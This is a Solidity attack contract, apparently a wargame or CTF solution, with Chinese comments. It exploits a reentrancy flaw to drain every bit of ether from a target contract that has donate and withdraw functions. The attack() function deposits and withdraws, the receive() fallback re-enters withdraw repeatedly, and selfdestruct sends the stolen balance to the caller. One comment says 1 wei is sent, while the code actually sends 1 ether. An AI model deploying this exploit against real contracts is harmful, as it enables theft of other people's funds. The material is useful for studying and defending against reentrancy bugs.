pragma solidity ^0.7;
interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}
contract Hack { 
    IReentrancy private immutable target;
    constructor(address _target){
        target =IReentrancy(_target);
    }
    function attack() external payable{
        //这个合约一开始先给被攻击合约转入1wei
        target.donate{value:1e18}(address(this));
        //这个用法表达的意思为调用这个函数并且传递自己合约的地址
        target.withdraw(1e18);
        require (address(target).balance==0,"target balance>0");
        selfdestruct(payable(msg.sender));
    }
    receive() external payable{
        uint amount=min(1e18,address(target).balance);
        if(amount>0){
        target.withdraw(amount);//这里再重入攻击
        }
    }
    function min(uint x,uint y) private pure returns (uint){
        return x<=y?x:y;
    }
}